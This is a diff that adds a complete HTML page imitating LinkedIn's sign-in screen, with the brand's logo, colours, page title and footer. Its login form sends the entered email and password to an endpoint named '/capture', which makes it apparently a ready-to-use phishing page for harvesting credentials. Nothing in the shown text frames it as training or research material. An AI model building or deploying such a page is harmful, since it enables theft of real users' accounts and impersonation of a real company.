@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LinkedIn: Log In or Sign Up</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#f3f2ef;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;flex-direction:column}
+  nav{background:#fff;padding:12px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e0dfdc}
+  .li-logo{display:flex;align-items:center;gap:6px;font-size:1.5rem;font-weight:700;color:#0a66c2}
+  .li-logo svg{fill:#0a66c2}
+  .nav-links{display:flex;gap:16px;align-items:center}
+  .nav-links a{color:#1c1c1c;text-decoration:none;font-size:.875rem}
+  .nav-btn{background:#0a66c2;color:#fff!important;border-radius:24px;padding:6px 16px}
+  .main{flex:1;display:flex;justify-content:center;align-items:center;padding:32px 16px;gap:40px}
+  .hero{max-width:400px}
+  .hero h1{font-size:2rem;font-weight:400;color:#8f5849;line-height:1.2;margin-bottom:12px;font-family:Georgia,serif}
+  .card{background:#fff;border-radius:8px;padding:32px;width:380px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+  .card h2{font-size:1.25rem;font-weight:600;margin-bottom:20px;color:#000}
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:.875rem;color:#666;margin-bottom:4px;font-weight:400}
+  .field input{
+    width:100%;border:1px solid #c7c7c7;border-radius:4px;
+    padding:10px 12px;font-size:1rem;font-family:inherit;outline:none;color:#000
+  }
+  .field input:focus{border-color:#0a66c2;border-width:2px}
+  .pw-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:4px}
+  .show-link{font-size:.8125rem;color:#0a66c2;cursor:pointer}
+  .show-link:hover{text-decoration:underline}
+  .forgot{display:block;font-size:.8125rem;color:#0a66c2;text-decoration:none;margin-bottom:20px}
+  .forgot:hover{text-decoration:underline;color:#004182}
+  .btn{width:100%;background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:14px;font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;transition:background .15s}
+  .btn:hover{background:#004182}
+  .or-row{display:flex;align-items:center;gap:12px;margin:16px 0}
+  .or-row hr{flex:1;border:none;border-top:1px solid #e0dfdc}
+  .or-row span{color:#aaa;font-size:.875rem}
+  .join-row{text-align:center;font-size:.875rem;color:#666}
+  .join-row a{color:#0a66c2;font-weight:600;text-decoration:none}
+  .join-row a:hover{text-decoration:underline}
+  footer{text-align:center;padding:16px;font-size:.75rem;color:#666}
+  footer a{color:#666;text-decoration:none;margin:0 6px}
+  footer a:hover{text-decoration:underline;color:#0a66c2}
+  @media(max-width:700px){.main{flex-direction:column;align-items:center}.hero{display:none}}
+</style>
+</head>
+<body>
+<nav>
+  <div class="li-logo">
+    <svg height="22" viewBox="0 0 34 34"><path d="M34 2.5v29A2.5 2.5 0 0131.5 34h-29A2.5 2.5 0 010 31.5v-29A2.5 2.5 0 012.5 0h29A2.5 2.5 0 0134 2.5zM10 13H5v16h5V13zm.45-4.5a2.95 2.95 0 10-5.9 0 2.95 2.95 0 005.9 0zM29 19.28c0-4.81-3.06-6.68-6.1-6.68a5.7 5.7 0 00-5.06 2.58H17.7V13H13v16h5v-8.51a3.32 3.32 0 013-3.58c1.86 0 2.97 1.24 2.97 3.53V29H29v-9.72z"/></svg>
+    <span>LinkedIn</span>
+  </div>
+  <div class="nav-links">
+    <a href="#">Join now</a>
+    <a href="#" class="nav-btn">Sign in</a>
+  </div>
+</nav>
+<div class="main">
+  <div class="hero">
+    <h1>Welcome to your professional community</h1>
+  </div>
+  <div class="card">
+    <h2>Sign in</h2>
+    <form method="POST" action="/capture" autocomplete="on">
+      <div class="field">
+        <label for="email">Email or phone</label>
+        <input name="email" id="email" type="text" required autocomplete="username">
+      </div>
+      <div class="field">
+        <div class="pw-row">
+          <label for="pw">Password</label>
+          <span class="show-link" onclick="var i=document.getElementById('pw');i.type=i.type==='password'?'text':'password';this.textContent=i.type==='password'?'Show':'Hide'">Show</span>
+        </div>
+        <input name="password" id="pw" type="password" required autocomplete="current-password">
+      </div>
+      <a href="#" class="forgot">Forgot password?</a>
+      <button class="btn" type="submit">Sign in</button>
+    </form>
+    <div class="or-row"><hr><span>or</span><hr></div>
+    <div class="join-row">New to LinkedIn? <a href="https://www.linkedin.com/signup">Join now</a></div>
+  </div>
+</div>
+<footer>
+  <a href="#">LinkedIn Corporation © 2024</a>
+  <a href="#">User Agreement</a>
+  <a href="#">Privacy Policy</a>
+  <a href="#">Cookie Policy</a>
+</footer>
+</body>
+</html>
